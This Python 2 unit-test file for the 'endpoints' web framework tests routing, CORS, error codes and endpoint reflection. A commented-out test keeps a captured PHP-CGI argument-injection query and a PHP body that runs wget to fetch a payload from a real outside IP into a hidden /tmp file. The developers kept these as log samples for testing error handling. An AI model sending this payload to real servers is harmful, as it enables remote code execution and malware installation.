from . import TestCase, skipIf, SkipTest
import os
import urlparse
import urllib
import hashlib
import json
import logging
from BaseHTTPServer import BaseHTTPRequestHandler
import time
import threading
import subprocess
import re
import StringIO
import codecs
import base64

import testdata

import endpoints
import endpoints.call


def create_controller():
    class FakeController(endpoints.Controller, endpoints.CorsMixin):
        def POST(self): pass
        def GET(self): pass

    res = endpoints.Response()

    req = endpoints.Request()
    req.method = 'GET'

    c = FakeController(req, res)
    return c


def create_modules(controller_prefix):
    d = {
        controller_prefix: os.linesep.join([
            "from endpoints import Controller",
            "class Default(Controller):",
            "    def GET(*args, **kwargs): pass",
            ""
        ]),
        "{}.default".format(controller_prefix): os.linesep.join([
            "from endpoints import Controller",
            "class Default(Controller):",
            "    def GET(*args, **kwargs): pass",
            ""
        ]),
        "{}.foo".format(controller_prefix): os.linesep.join([
            "from endpoints import Controller",
            "class Default(Controller):",
            "    def GET(*args, **kwargs): pass",
            "",
            "class Bar(Controller):",
            "    def GET(*args, **kwargs): pass",
            "    def POST(*args, **kwargs): pass",
            ""
        ]),
        "{}.foo.baz".format(controller_prefix): os.linesep.join([
            "from endpoints import Controller",
            "class Default(Controller):",
            "    def GET(*args, **kwargs): pass",
            "",
            "class Che(Controller):",
            "    def GET(*args, **kwargs): pass",
            ""
        ]),
        "{}.foo.boom".format(controller_prefix): os.linesep.join([
            "from endpoints import Controller",
            "",
            "class Bang(Controller):",
            "    def GET(*args, **kwargs): pass",
            ""
        ]),
    }
    r = testdata.create_modules(d)

    s = set(d.keys())
    return s


class ControllerTest(TestCase):
    def test_cors_mixin(self):
        class Cors(endpoints.Controller, endpoints.CorsMixin):
            def POST(self): pass

        res = endpoints.Response()
        req = endpoints.Request()
        c = Cors(req, res)
        self.assertTrue(c.OPTIONS)
        self.assertFalse('Access-Control-Allow-Origin' in c.response.headers)

        req.set_header('Origin', 'http://example.com')
        c = Cors(req, res)
        self.assertEqual(req.get_header('Origin'), c.response.get_header('Access-Control-Allow-Origin')) 

        req.set_header('Access-Control-Request-Method', 'POST')
        req.set_header('Access-Control-Request-Headers', 'xone, xtwo')
        c = Cors(req, res)
        c.OPTIONS()
        self.assertEqual(req.get_header('Origin'), c.response.get_header('Access-Control-Allow-Origin'))
        self.assertEqual(req.get_header('Access-Control-Request-Method'), c.response.get_header('Access-Control-Allow-Methods')) 
        self.assertEqual(req.get_header('Access-Control-Request-Headers'), c.response.get_header('Access-Control-Allow-Headers')) 

        c = Cors(req, res)
        c.POST()
        self.assertEqual(req.get_header('Origin'), c.response.get_header('Access-Control-Allow-Origin')) 

    def test_bad_typeerror(self):
        """There is a bug that is making the controller method is throw a 404 when it should throw a 500"""
        controller_prefix = "badtypeerror"
        contents = os.linesep.join([
            "from endpoints import Controller",
            "class Default(Controller):",
            "    def GET(self):",
            "        raise TypeError('This should not cause a 404')"
        ])
        testdata.create_module("{}.typerr".format(controller_prefix), contents=contents)

        c = endpoints.Call(controller_prefix)
        c.response = endpoints.Response()
        r = endpoints.Request()
        r.method = 'GET'
        r.path = '/typerr'
        c.request = r

        res = c.handle()
        self.assertEqual(500, res.code)

        controller_prefix = "badtypeerror2"
        contents = os.linesep.join([
            "from endpoints import Controller",
            "class Bogus(object):",
            "    def handle_controller(self, foo):",
            "        pass",
            "",
            "class Default(Controller):",
            "    def GET(self):",
            "        b = Bogus()",
            "        b.handle_controller()",
        ])
        testdata.create_module("{}.typerr2".format(controller_prefix), contents=contents)

        c = endpoints.Call(controller_prefix)
        c.response = endpoints.Response()
        r = endpoints.Request()
        r.method = 'GET'
        r.path = '/typerr2'
        c.request = r
        res = c.handle()
        self.assertEqual(500, res.code)


class RouterTest(TestCase):

    def test_mixed_modules_packages(self):
        # make sure a package with modules and other packages will resolve correctly
        controller_prefix = "mmp"
        r = testdata.create_modules({
            controller_prefix: os.linesep.join([
                "from endpoints import Controller",
                "class Default(Controller): pass",
            ]),
            "{}.foo".format(controller_prefix): os.linesep.join([
                "from endpoints import Controller",
                "class Default(Controller): pass",
            ]),
            "{}.foo.bar".format(controller_prefix): os.linesep.join([
                "from endpoints import Controller",
                "class Default(Controller): pass",
            ]),
            "{}.che".format(controller_prefix): os.linesep.join([
                "from endpoints import Controller",
                "class Default(Controller): pass",
            ]),
        })
        r = endpoints.call.Router(controller_prefix)
        self.assertEqual(set(['mmp.foo', 'mmp', 'mmp.foo.bar', 'mmp.che']), r.controllers)

        # make sure just a file will resolve correctly
        controller_prefix = "mmp2"
        testdata.create_module(controller_prefix, os.linesep.join([
            "from endpoints import Controller",
            "class Bar(Controller): pass",
        ]))
        r = endpoints.call.Router(controller_prefix)
        self.assertEqual(set(['mmp2']), r.controllers)

    def test_routing_module(self):
        controller_prefix = "callback_info"
        contents = os.linesep.join([
            "from endpoints import Controller",
            "class Bar(Controller):",
            "    def GET(*args, **kwargs): pass"
        ])
        testdata.create_module("{}.foo".format(controller_prefix), contents=contents)
        r = endpoints.call.Router(controller_prefix, ["foo", "bar"])

    def test_routing_package(self):
        basedir = testdata.create_dir()
        controller_prefix = "routepack"
        testdata.create_dir(controller_prefix, tmpdir=basedir)
        contents = os.linesep.join([
            "from endpoints import Controller",
            "",
            "class Default(Controller):",
            "    def GET(self): pass",
            "",
        ])
        f = testdata.create_module(controller_prefix, contents=contents, tmpdir=basedir)

        r = endpoints.call.Router(controller_prefix, [])
        self.assertTrue(controller_prefix in r.controllers)
        self.assertEqual(1, len(r.controllers))

    def test_routing(self):
        """there was a bug that caused errors raised after the yield to return another
        iteration of a body instead of raising them"""
        controller_prefix = "routing1"
        contents = os.linesep.join([
            "from endpoints import Controller",
            "class Default(Controller):",
            "    def GET(self): pass",
            "",
            "class Foo(Controller):",
            "    def GET(self): pass",
            "",
            "class Bar(Controller):",
            "    def GET(self): pass",
        ])
        testdata.create_module(controller_prefix, contents=contents)

        r = endpoints.call.Router(controller_prefix, [])
        self.assertEqual(r.controller_module_name, controller_prefix)
        self.assertEqual(r.controller_class_name, "Default")

        r = endpoints.call.Router(controller_prefix, ["foo", "che", "baz"])
        self.assertEqual(2, len(r.controller_method_args))
        self.assertEqual(r.controller_class_name, "Foo")


class CallTest(TestCase):
    def test_default_match_with_path(self):
        """when the default controller is used, make sure it falls back to default class
        name if the path bit fails to be a controller class name"""
        controller_prefix = "nomodcontroller2"
        contents = os.linesep.join([
            "from endpoints import Controller",
            "class Default(Controller):",
            "    def GET(self, *args, **kwargs):",
            "        return args[0]"
        ])
        testdata.create_module("{}.nmcon".format(controller_prefix), contents=contents)

        c = endpoints.Call(controller_prefix)
        r = endpoints.Request()
        r.method = 'GET'
        r.path = '/nmcon/8'
        c.request = r
        c.response = endpoints.Response()

        res = c.handle()
        self.assertEqual('"8"', res.body)

    def test_no_match(self):
        """make sure a controller module that imports a class with the same as
        one of the query args doesen't get picked up as the controller class"""
        controller_prefix = "nomodcontroller"
        r = testdata.create_modules({
            "nomod": os.linesep.join([
                "class Nomodbar(object): pass",
                ""
            ]),
            controller_prefix: os.linesep.join([
                "from endpoints import Controller",
                "from nomod import Nomodbar",
                "class Default(Controller):",
                "    def GET(): pass",
                ""
            ])
        })

        c = endpoints.Call(controller_prefix)
        r = endpoints.Request()
        r.method = 'GET'
        r.path = '/nomodbar' # same name as one of the non controller classes
        c.request = r
        info = c.get_controller_info()

        self.assertEqual('Default', info['class_name'])
        self.assertEqual('nomodcontroller', info['module_name'])
        self.assertEqual('nomodbar', info['args'][0])

    def test_import_error(self):
        controller_prefix = "importerrorcontroller"
        r = testdata.create_modules({
            controller_prefix: os.linesep.join([
                "from endpoints import Controller",
                "from does_not_exist import FairyDust",
                "class Default(Controller):",
                "    def GET(): pass",
                ""
            ])
        })

        c = endpoints.Call(controller_prefix)
        r = endpoints.Request()
        r.method = 'GET'
        r.path = '/'
        c.request = r
        with self.assertRaises(endpoints.CallError):
            info = c.get_callback_info()

    def test_get_controller_info_default(self):
        """I introduced a bug on 1-12-14 that caused default controllers to fail
        to be found, this makes sure that bug is squashed"""
        controller_prefix = "controller_info_default"
        r = testdata.create_modules({
            controller_prefix: os.linesep.join([
                "from endpoints import Controller",
                "class Default(Controller):",
                "    def GET(): pass",
                ""
            ])
        })

        c = endpoints.Call(controller_prefix)
        r = endpoints.Request()
        r.method = 'GET'
        r.path = '/'
        c.request = r
        info = c.get_controller_info()
        self.assertEqual(u'Default', info['class_name'])
        self.assertTrue(issubclass(info['class'], endpoints.Controller))


    def test_get_controller_info(self):
        controller_prefix = "controller_info_advanced"
        s = create_modules(controller_prefix)

        ts = [
            {
                'in': dict(method=u"GET", path="/foo/bar/happy/sad"),
                'out': {
                    'module_name': u"controller_info_advanced.foo",
                    'class_name': u'Bar',
                    'args': [u'happy', u'sad'],
                    'method': u"GET",
                }
            },
            {
                'in': dict(method=u"GET", path="/"),
                'out': {
                    'module_name': u"controller_info_advanced",
                    'class_name': u'Default',
                    'args': [],
                    'method': u"GET",
                }
            },
            {
                'in': dict(method=u"GET", path="/happy"),
                'out': {
                    'module_name': u"controller_info_advanced",
                    'class_name': u'Default',
                    'args': [u"happy"],
                    'method': u"GET",
                }
            },
            {
                'in': dict(method=u"GET", path="/foo/baz"),
                'out': {
                    'module_name': u"controller_info_advanced.foo.baz",
                    'class_name': u'Default',
                    'args': [],
                    'method': u"GET",
                }
            },
            {
                'in': dict(method=u"GET", path="/foo/baz/che"),
                'out': {
                    'module_name': u"controller_info_advanced.foo.baz",
                    'class_name': u'Che',
                    'args': [],
                    'method': u"GET",
                }
            },
            {
                'in': dict(method=u"GET", path="/foo/baz/happy"),
                'out': {
                    'module_name': u"controller_info_advanced.foo.baz",
                    'class_name': u'Default',
                    'args': [u"happy"],
                    'method': u"GET",
                }
            },
            {
                'in': dict(method=u"GET", path="/foo/happy"),
                'out': {
                    'module_name': u"controller_info_advanced.foo",
                    'class_name': u'Default',
                    'args': [u"happy"],
                    'method': u"GET",
                }
            },
        ]

        for t in ts:
            r = endpoints.Request()
            for key, val in t['in'].iteritems():
                setattr(r, key, val)

            c = endpoints.Call(controller_prefix)
            c.request = r

            d = c.get_controller_info()
            for key, val in t['out'].iteritems():
                self.assertEqual(val, d[key])

    def test_callback_info(self):
        controller_prefix = "callback_info"
        r = endpoints.Request()
        r.path = u"/foo/bar"
        r.path_args = [u"foo", u"bar"]
        r.query_kwargs = {u'foo': u'bar', u'che': u'baz'}
        r.method = u"GET"
        c = endpoints.Call(controller_prefix)
        c.request = r

        with self.assertRaises(endpoints.CallError):
            d = c.get_callback_info()

        contents = os.linesep.join([
            "from endpoints import Controller",
            "class Bar(Controller):",
            "    def GET(*args, **kwargs): pass"
        ])
        testdata.create_module("{}.foo".format(controller_prefix), contents=contents)

        # if it succeeds, then it passed the test :)
        d = c.get_callback_info()

    def test_public_controller(self):
        contents = os.linesep.join([
            "from endpoints import Controller",
            "class Bar(Controller):",
            "    def get(*args, **kwargs): pass"
        ])
        testdata.create_module("controller2.foo2", contents=contents)

        r = endpoints.Request()
        r.path = u"/foo2/bar"
        r.path_args = [u"foo2", u"bar"]
        r.query_kwargs = {u'foo2': u'bar', u'che': u'baz'}
        r.method = u"GET"
        c = endpoints.Call("controller2")
        c.request = r

        # if it succeeds, then it passed the test :)
        with self.assertRaises(endpoints.CallError):
            d = c.get_callback_info()

    def test_handle_redirect(self):
        contents = os.linesep.join([
            "from endpoints import Controller, Redirect",
            "class Testredirect(Controller):",
            "    def GET(*args, **kwargs):",
            "        raise Redirect('http://example.com')"
        ])
        testdata.create_module("controllerhr.handle", contents=contents)

        r = endpoints.Request()
        r.path = u"/handle/testredirect"
        r.path_args = [u'handle', u'testredirect']
        r.query_kwargs = {}
        r.method = u"GET"
        c = endpoints.Call("controllerhr")
        c.response = endpoints.Response()
        c.request = r

        res = c.handle()
        self.assertEqual(302, res.code)
        self.assertEqual('http://example.com', res.headers['Location'])

    def test_handle_404_typeerror(self):
        """make sure not having a controller is correctly identified as a 404"""
        controller_prefix = "h404te"
        s = create_modules(controller_prefix)
        r = endpoints.Request()
        r.method = u'GET'
        r.path = u'/foo/boom'

        c = endpoints.Call(controller_prefix)
        c.response = endpoints.Response()
        c.request = r

        res = c.handle()
        self.assertEqual(404, res.code)

    def test_handle_404_typeerror_2(self):
        """make sure 404 works when a path bit is missing"""
        controller_prefix = "h404te2"
        contents = os.linesep.join([
            "from endpoints import Controller, decorators",
            "class Default(Controller):",
            "    def GET(self, needed_bit, **kwargs):",
            "       return ''",
            "",
            "    def POST(self, needed_bit, **kwargs):",
            "       return ''",
            "",
            "class Htype(Controller):",
            "    def POST(self, needed_bit, **kwargs):",
            "       return ''",
            "",
            "class Hdec(Controller):",
            "    @decorators.param('foo', default='bar')",
            "    def POST(self, needed_bit, **kwargs):",
            "       return ''",
            "",
        ])
        testdata.create_module(controller_prefix, contents=contents)
        c = endpoints.Call(controller_prefix)
        c.response = endpoints.Response()

        r = endpoints.Request()
        r.method = u'POST'
        r.path = u'/hdec'
        c.request = r
        res = c.handle()
        self.assertEqual(404, res.code)

        r = endpoints.Request()
        r.method = u'POST'
        r.path = u'/htype'
        c.request = r
        res = c.handle()
        self.assertEqual(404, res.code)

        r = endpoints.Request()
        r.method = u'GET'
        r.path = u'/'
        c.request = r
        res = c.handle()
        self.assertEqual(404, res.code)

        r = endpoints.Request()
        r.method = u'POST'
        r.path = u'/'
        c.request = r
        res = c.handle()
        self.assertEqual(404, res.code)

    def test_handle_404_typeerror_3(self):
        """there was an error when there was only one expected argument, turns out
        the call was checking for "arguments" when the message just had "argument" """
        controller_prefix = "h404te3"
        contents = os.linesep.join([
            "from endpoints import Controller",
            "class Foo(Controller):",
            "    def GET(self): pass",
            "",
        ])
        testdata.create_module(controller_prefix, contents=contents)
        c = endpoints.Call(controller_prefix)
        c.response = endpoints.Response()

        r = endpoints.Request()
        r.method = u'GET'
        r.path = u'/foo/bar/baz'
        r.query = 'che=1&boo=2'
        c.request = r
        res = c.handle()
        self.assertEqual(404, res.code)

    def test_handle_accessdenied(self):
        """raising an AccessDenied error should set code to 401 and the correct header"""
        controller_prefix = "haccessdenied"
        contents = os.linesep.join([
            "from endpoints import Controller, AccessDenied",
            "class Default(Controller):",
            "    def GET(*args, **kwargs):",
            "        raise AccessDenied('basic')",
        ])
        testdata.create_module(controller_prefix, contents=contents)
        r = endpoints.Request()
        r.method = u'GET'
        r.path = u'/'

        c = endpoints.Call(controller_prefix)
        c.response = endpoints.Response()
        c.request = r

        res = c.handle()
        res.body # we need to cause the body to be handled
        self.assertEqual(401, res.code)
        self.assertTrue('Basic' in res.headers['WWW-Authenticate'])

    def test_handle_callstop(self):
        contents = os.linesep.join([
            "from endpoints import Controller, CallStop",
            "class Testcallstop(Controller):",
            "    def GET(*args, **kwargs):",
            "        raise CallStop(205, None)",
            "",
            "class Testcallstop2(Controller):",
            "    def GET(*args, **kwargs):",
            "        raise CallStop(200, 'this is the body')",
            "",
            "class Testcallstop3(Controller):",
            "    def GET(*args, **kwargs):",
            "        raise CallStop(204, 'this is ignored')",
        ])
        testdata.create_module("handlecallstop", contents=contents)

        r = endpoints.Request()
        r.path = u"/testcallstop"
        r.path_args = [u'testcallstop']
        r.query_kwargs = {}
        r.method = u"GET"
        c = endpoints.Call("handlecallstop")
        c.response = endpoints.Response()
        c.request = r

        res = c.handle()
        self.assertEqual('', res.body)
        self.assertEqual(None, res._body)
        self.assertEqual(205, res.code)

        r.path = u"/testcallstop2"
        r.path_args = [u'testcallstop2']
        res = c.handle()
        self.assertEqual('"this is the body"', res.body)
        self.assertEqual(200, res.code)

        r.path = u"/testcallstop3"
        r.path_args = [u'testcallstop3']
        res = c.handle()
        self.assertEqual(None, res._body)
        self.assertEqual(204, res.code)

#     def test_bad_query_bad_path(self):
#         """Jarid and I noticed these errors always popping up in the logs, they 
#         are genuine errors but are misidentified as 417 when they should be 404"""
#         return
#         controller_prefix = "badquerybadpath"
#         r = testdata.create_modules({
#             controller_prefix: os.linesep.join([
#                 "from endpoints import Controller",
#                 "class Default(Controller):",
#                 "    def GET(self): pass",
#                 "    def POST(self): pass",
#                 ""
#             ])
#         })
# 
#         c = endpoints.Call(controller_prefix)
#         r = endpoints.Request()
#         r.method = 'GET'
#         r.path = '/foo/bar'
#         #r.query = "%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E"
#         #r.body = '<?php system("wget 78.109.82.33/apache2-default/.a/hb/php01 -O /tmp/.0e1bc.log'
#         c.request = r
# 
#         res = c.handle()
#         pout.v(res)
#         return
#         info = c.get_callback_info()
#         pout.v(info)
# 
#         # with self.assertRaises(endpoints.CallError):
# #             info = c.get_callback_info()


class CallVersioningTest(TestCase):
    def test_get_version(self):
        r = endpoints.Request()
        r.headers = {u'accept': u'application/json;version=v1'}

        c = endpoints.Call("controller")
        c.request = r

        v = c.version
        self.assertEqual(u'v1', v)

    def test_get_version_default(self):
        """turns out, calls were failing if there was no accept header even if there were defaults set"""
        r = endpoints.Request()
        r.headers = {}

        c = endpoints.Call("controller")
        c.request = r
        r.headers = {}
        c.content_type = u'application/json'
        self.assertEqual(None, c.version)

        c = endpoints.Call("controller")
        c.request = r
        r.headers = {u'accept': u'application/json;version=v1'}
        self.assertEqual(u'v1', c.version)

        c = endpoints.Call("controller")
        c.request = r
        c.content_type = None
        with self.assertRaises(ValueError):
            v = c.version

        c = endpoints.Call("controller")
        c.request = r
        r.headers = {u'accept': u'*/*'}
        c.content_type = u'application/json'
        self.assertEqual(None, c.version)

        c = endpoints.Call("controller")
        c.request = r
        r.headers = {u'accept': u'*/*;version=v8'}
        c.content_type = u'application/json'
        self.assertEqual(u'v8', c.version)

    def test_normalize_method(self):
        r = endpoints.Request()
        r.headers = {u'accept': u'application/json;version=v1'}
        r.method = 'POST'

        c = endpoints.Call("foo.bar")
        c.content_type = u'application/json'
        c.request = r

        method = c.get_normalized_method()
        self.assertEqual(u"POST_v1", method)


class ReflectTest(TestCase):
    def test_decorators_inherit_2(self):
        """you have a parent class with POST method, the child also has a POST method,
        what do you do? What. Do. You. Do?"""
        prefix = "decinherit2"
        m = testdata.create_modules(
            {
                prefix: os.linesep.join([
                    "import endpoints",
                    "",
                    "def a(f):",
                    "    def wrapped(*args, **kwargs):",
                    "        return f(*args, **kwargs)",
                    "    return wrapped",
                    "",
                    "class b(object):",
                    "    def __init__(self, func):",
                    "        self.func = func",
                    "    def __call__(*args, **kwargs):",
                    "        return f(*args, **kwargs)",
                    "",
                    "def c(func):",
                    "    def wrapper(*args, **kwargs):",
                    "        return func(*args, **kwargs)",
                    "    return wrapper",
                    "",
                    "def POST(): pass",
                    "",
                    "class D(object):",
                    "    def HEAD(): pass"
                    "",
                    "class _BaseController(endpoints.Controller):",
                    "    @a",
                    "    @b",
                    "    def POST(self, **kwargs): pass",
                    "",
                    "    @a",
                    "    @b",
                    "    def HEAD(self): pass",
                    "",
                    "    @a",
                    "    @b",
                    "    def GET(self): pass",
                    "",
                    "class Default(_BaseController):",
                    "    @c",
                    "    def POST(self, **kwargs): POST()",
                    "",
                    "    @c",
                    "    def HEAD(self):",
                    "        d = D()",
                    "        d.HEAD()",
                    "",
                    "    @c",
                    "    def GET(self):",
                    "        super(Default, self).GET()",
                    "",
                ]),
            }
        )

        rs = endpoints.Reflect(prefix, 'application/json')
        l = list(rs.get_endpoints())
        r = l[0]
        self.assertEqual(1, len(r.decorators["POST"]))
        self.assertEqual(1, len(r.decorators["HEAD"]))
        self.assertEqual(3, len(r.decorators["GET"]))


    def test_decorator_inherit_1(self):
        """make sure that a child class that hasn't defined a METHOD inherits the
        METHOD method from its parent with decorators in tact"""
        prefix = "decinherit"
        tmpdir = testdata.create_dir(prefix)
        m = testdata.create_modules(
            {
                "foodecinherit": os.linesep.join([
                    "import endpoints",
                    "",
                    "def foodec(func):",
                    "    def wrapper(*args, **kwargs):",
                    "        return func(*args, **kwargs)",
                    "    return wrapper",
                    "",
                    "class _BaseController(endpoints.Controller):",
                    "    @foodec",
                    "    def POST(self, **kwargs):",
                    "        return 1",
                    "",
                    "class Default(_BaseController):",
                    "    pass",
                    "",
                ]),
            },
            tmpdir=tmpdir
        )

        controller_prefix = "foodecinherit"
        rs = endpoints.Reflect(controller_prefix, 'application/json')
        for count, endpoint in enumerate(rs, 1):
            self.assertEqual("foodec", endpoint.decorators["POST"][0][0])
        self.assertEqual(1, count)

    def test_super_typeerror(self):
        """this test was an attempt to replicate an issue we are having on production,
        sadly, it doesn't replicate it"""
        raise SkipTest("I can't get this to hit the error we were getting")
        prefix = "supertypeerror"
        tmpdir = testdata.create_dir(prefix)
        m = testdata.create_modules(
            {
                "typerr.superfoo": os.linesep.join([
                    "import endpoints",
                    "",
                    "class _BaseController(endpoints.Controller):",
                    "    def __init__(self, *args, **kwargs):",
                    "        super(_BaseController, self).__init__(*args, **kwargs)",
                    "",
                    "class Default(_BaseController):",
                    "    def GET(self): pass",
                    "",
                ]),
                "typerr.superfoo.superbar": os.linesep.join([
                    "from . import _BaseController",
                    "",
                    "class _BarBaseController(_BaseController):",
                    "    def __init__(self, *args, **kwargs):",
                    "        super(_BarBaseController, self).__init__(*args, **kwargs)",
                    "",
                    "class Default(_BaseController):",
                    "    def GET(self): pass",
                    "",
                ])
            },
            tmpdir=tmpdir
        )

        #import typerr.superfoo
        #import typerr.superfoo.superbar

        controller_prefix = "typerr"
        rs = endpoints.Reflect(controller_prefix, 'application/json')
        for endpoint in rs:
            ds = endpoint.decorators
            edesc = endpoint.desc
            for option_name, options in endpoint.methods.items():
                for option in options:
                    v = option.version
                    params = option.params
                    for p, pd in params.items():
                        pass

                    headers = dict(option.headers)
                    desc = option.desc

        r = endpoints.Request()
        r.method = "GET"
        r.path = "/superfoo/superbar"
        c = endpoints.Call(controller_prefix)
        c.request = r
        c.response = endpoints.Response()
        res = c.handle()
        #pout.v(res.code, res.body)


    def test_get_methods(self):
        # this doesn't work right now, I've moved this functionality into Reflect
        # this method needs to be updated to work
        return
        class GetMethodsController(endpoints.Controller):
            def POST(self): pass
            def GET(self): pass
            def ABSURD(self): pass
            def ignORED(self): pass

        options = GetMethodsController.get_methods()
        self.assertEqual(3, len(options))
        for o in ['ABSURD', 'GET', 'POST']:
            self.assertTrue(o in options)

    def test_docblock(self):
        tmpdir = testdata.create_dir("reflectdoc")
        testdata.create_modules(
            {
                "doc.block": os.linesep.join([
                    "import endpoints",
                    "class Foo(endpoints.Controller):",
                    "    '''this is a multiline docblock",
                    "",
                    "    this means it has...",
                    "    ",
                    "    multiple lines",
                    "    '''",
                    "    def GET(*args, **kwargs): pass",
                    "",
                ])
            },
            tmpdir=tmpdir
        )

        rs = endpoints.Reflect("doc", 'application/json')
        for endpoint in rs:
            self.assertTrue("\n" in endpoint.desc)

    def test_method_docblock(self):
        tmpdir = testdata.create_dir("reflectdoc")
        testdata.create_modules(
            {
                "mdoc.mblock": os.linesep.join([
                    "import endpoints",
                    "class Foo(endpoints.Controller):",
                    "    '''controller docblock'''",
                    "    def GET(*args, **kwargs):",
                    "        '''method docblock'''",
                    "        pass",
                    "",
                ])
            },
            tmpdir=tmpdir
        )

        rs = endpoints.Reflect("mdoc", 'application/json')
        for endpoint in rs:
            desc = endpoint.methods['GET'][0].desc
            self.assertEqual("method docblock", desc)
 
    def test_method_docblock_bad_decorator(self):
        tmpdir = testdata.create_dir("reflectdoc2")
        testdata.create_modules(
            {
                "mdoc2.mblock": os.linesep.join([
                    "import endpoints",
                    "",
                    "def bad_dec(func):",
                    "    def wrapper(*args, **kwargs):",
                    "        return func(*args, **kwargs)",
                    "    return wrapper",
                    "",
                    "class Foo(endpoints.Controller):",
                    "    '''controller docblock'''",
                    "    @bad_dec",
                    "    def GET(*args, **kwargs):",
                    "        '''method docblock'''",
                    "        pass",
                    "",
                    "    def POST(*args, **kwargs):",
                    "        '''should not return this docblock'''",
                    "        pass",
                    "",
                ])
            },
            tmpdir=tmpdir
        )

        rs = endpoints.Reflect("mdoc2", 'application/json')
        for endpoint in rs:
            desc = endpoint.methods['GET'][0].desc
            self.assertEqual("method docblock", desc)
 
    def test_get_versioned_endpoints(self):
        # putting the C back in CRUD
        tmpdir = testdata.create_dir("versionreflecttest")
        testdata.create_modules(
            {
                "controller_vreflect.foo": os.linesep.join([
                    "import endpoints",
                    "from endpoints.decorators import param, require_params",
                    "class Bar(endpoints.Controller):",
                    "    @param('foo', default=1, type=int)",
                    "    @param('bar', type=bool, required=False)",
                    "    def GET(*args, **kwargs): pass",
                    "",
                    "    def GET_v2(*args, **kwargs): pass",
                    ""
                ]),
                "controller_vreflect.che": os.linesep.join([
                    "from endpoints import Controller",
                    "class Baz(Controller):",
                    "    def GET_v3(*args, **kwargs): pass",
                    ""
                ]),
            },
            tmpdir=tmpdir
        )

        rs = endpoints.Reflect("controller_vreflect", 'application/json')
#         for endpoint in rs.get_endpoints():
#             for method_name, methods in endpoint.methods.items():
#                 for method in methods:
#                     pout.v(method.headers, method.version)
# 

        l = list(rs.get_endpoints())

        self.assertEqual(2, len(l))
        for d in l:
            self.assertEqual(1, len(d.methods))

        def get_match(endpoint_uri, l):
            ret = {}
            for d in l:
                if d.uri == endpoint_uri:
                    ret = d
            return ret

        d = get_match("/foo/bar", l)
        self.assertTrue(d)

        d = get_match("/che/baz", l)
        self.assertTrue(d)

    def test_decorators(self):
        testdata.create_modules({
            "controller_reflect": os.linesep.join([
                "import endpoints",
                "from endpoints.decorators import param, require_params",
                "",
                "def dec_func(f):",
                "    def wrapped(*args, **kwargs):",
                "        return f(*args, **kwargs)",
                "    return wrapped",
                "",
                "class dec_cls(object):",
                "    def __init__(self, func):",
                "        self.func = func",
                "    def __call__(*args, **kwargs):",
                "        return f(*args, **kwargs)",
                "",
                "class Foo(endpoints.Controller):",
                "    @dec_func",
                "    def GET(*args, **kwargs): pass",
                "    @dec_cls",
                "    @param('foo', default=1, type=int)",
                "    @param('bar', type=bool, required=False)",
                "    @param('che_empty', type=dict, default={})",
                "    @param('che_full', type=dict, default={'key': 'val', 'key2': 2.0})",
                "    @param('baz_empty', type=list, default=[])",
                "    @param('baz_full', type=list, default=['val', False, 1])",
                "    @require_params('a', 'b', 'c')",
                "    @param('d')",
                "    def POST(*args, **kwargs): pass",
                ""
            ])
        })

        rs = endpoints.Reflect("controller_reflect")
        l = list(rs.get_endpoints())
        r = l[0]

        methods = r.methods
        params = methods['POST'][0].params
        for p in ['a', 'b', 'c', 'd']:
            self.assertTrue(params[p]['required'])

        for p in ['foo', 'bar', 'che_empty', 'che_full', 'baz_empty', 'baz_full']:
            self.assertFalse(params[p]['required'])

        self.assertEqual(1, len(l))
        self.assertEqual(u'/foo', r.uri)
        self.assertSetEqual(set(['GET', 'POST']), set(r.methods.keys()))

    def test_decorators_param_help(self):
        testdata.create_modules({
            "dec_param_help.foo": os.linesep.join([
                "import endpoints",
                "from endpoints.decorators import param, require_params",
                "class Default(endpoints.Controller):",
                "    @param('baz_full', type=list, default=['val', False, 1], help='baz_full')",
                "    @param('d', help='d')",
                "    def POST(*args, **kwargs): pass",
                ""
            ])
        })

        rs = endpoints.Reflect("dec_param_help")
        l = list(rs.get_endpoints())
        r = l[0]

        methods = r.methods
        params = methods['POST'][0].params
        for k, v in params.items():
            self.assertEqual(k, v['options']['help'])

    def test_get_endpoints(self):
        # putting the C back in CRUD
        tmpdir = testdata.create_dir("reflecttest")
        testdata.create_modules(
            {
                "controller_reflect_endpoints": os.linesep.join([
                    "import endpoints",
                    "class Default(endpoints.Controller):",
                    "    def GET(*args, **kwargs): pass",
                    ""
                ]),
                "controller_reflect_endpoints.foo": os.linesep.join([
                    "import endpoints",
                    "class Default(endpoints.Controller):",
                    "    def GET(*args, **kwargs): pass",
                    ""
                ]),
                "controller_reflect_endpoints.che": os.linesep.join([
                    "from endpoints import Controller",
                    "class Baz(Controller):",
                    "    def POST(*args, **kwargs): pass",
                    ""
                ]),
                "controller_reflect_endpoints.che.bam": os.linesep.join([
                    "from endpoints import Controller as Con",
                    "class _Base(Con):",
                    "    def GET(*args, **kwargs): pass",
                    "",
                    "class Boo(_Base):",
                    "    def DELETE(*args, **kwargs): pass",
                    "    def POST(*args, **kwargs): pass",
                    ""
                    "class Bah(_Base):",
                    "    '''this is the doc string'''",
                    "    def HEAD(*args, **kwargs): pass",
                    ""
                ])
            },
            tmpdir=tmpdir
        )

        r = endpoints.Reflect("controller_reflect_endpoints")
        l = list(r.get_endpoints())
        self.assertEqual(5, len(l))

        def get_match(endpoint, l):
            for d in l:
                if d.uri == endpoint:
                    return d

        d = get_match("/che/bam/bah", l)
        self.assertSetEqual(set(["GET", "HEAD"]), set(d.methods.keys()))
        self.assertGreater(len(d.desc), 0)

        d = get_match("/", l)
        self.assertNotEqual(d, None)

        d = get_match("/foo", l)
        self.assertNotEqual(d, None)


class EndpointsTest(TestCase):
    def test_get_controllers(self):
        controller_prefix = "get_controllers"
        s = create_modules(controller_prefix)

        r = endpoints.call.Router(controller_prefix)
